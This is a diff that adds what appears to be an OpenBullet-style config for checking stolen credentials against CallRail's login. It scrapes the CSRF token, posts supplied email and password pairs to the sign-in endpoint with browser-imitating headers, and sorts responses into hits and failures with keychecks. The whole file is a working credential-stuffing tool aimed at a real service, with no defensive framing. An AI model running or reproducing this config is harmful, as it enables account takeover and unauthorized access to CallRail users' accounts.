@@ -1,0 +1,65 @@
+BLOCK:HttpRequest
+LABEL:GetLoginPage
+  url = "https://app.callrail.com/login"
+  customHeaders = {("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"), ("accept-language", "en-US,en;q=0.9"), ("accept-encoding", "gzip, deflate, br"), ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"), ("upgrade-insecure-requests", "1")}
+  TYPE:STANDARD
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractCSRFToken
+  input = @data.SOURCE
+  leftDelim = "name=\"authenticity_token\" value=\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @CSRFToken
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractCSRFTokenAlt
+  input = @data.SOURCE
+  leftDelim = "csrf-token\" content=\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @CSRFToken
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractCSRFTokenMeta
+  input = @data.SOURCE
+  leftDelim = "<meta name=\"csrf-token\" content=\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @CSRFToken
+ENDBLOCK
+
+BLOCK:HttpRequest
+LABEL:Login
+  url = "https://app.callrail.com/users/sign_in"
+  method = POST
+  customHeaders = {("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"), ("accept-language", "en-US,en;q=0.9"), ("accept-encoding", "gzip, deflate, br"), ("content-type", "application/x-www-form-urlencoded"), ("origin", "https://app.callrail.com"), ("referer", "https://app.callrail.com/login"), ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"), ("upgrade-insecure-requests", "1")}
+  TYPE:STANDARD
+  "authenticity_token=@CSRFToken&user[email]=@input.USER&user[password]=@input.PASS&user[remember_me]=0&commit=Sign+in"
+ENDBLOCK
+
+BLOCK:Keycheck
+  KEYCHAIN FAIL OR
+    STRINGKEY @data.SOURCE Contains "Invalid email or password"
+    STRINGKEY @data.SOURCE Contains "incorrect email or password"
+    STRINGKEY @data.SOURCE Contains "authentication failed"
+    STRINGKEY @data.SOURCE Contains "error"
+    STRINGKEY @data.SOURCE Contains "alert-danger"
+    STRINGKEY @data.SOURCE Contains "alert alert-danger"
+    STRINGKEY @data.RESPONSECODE Contains "401"
+    STRINGKEY @data.RESPONSECODE Contains "403"
+    STRINGKEY @data.RESPONSECODE Contains "422"
+  KEYCHAIN SUCCESS OR
+    STRINGKEY @data.SOURCE Contains "/dashboard"
+    STRINGKEY @data.SOURCE Contains "/accounts"
+    STRINGKEY @data.SOURCE Contains "CallRail"
+    STRINGKEY @data.SOURCE Contains "Sign out"
+    STRINGKEY @data.SOURCE Contains "logout"
+    STRINGKEY @data.HEADERS["Location"] Contains "/dashboard"
+    STRINGKEY @data.HEADERS["Location"] Contains "/accounts"
+    STRINGKEY @data.RESPONSECODE Contains "200"
+    STRINGKEY @data.RESPONSECODE Contains "302"
+ENDBLOCK
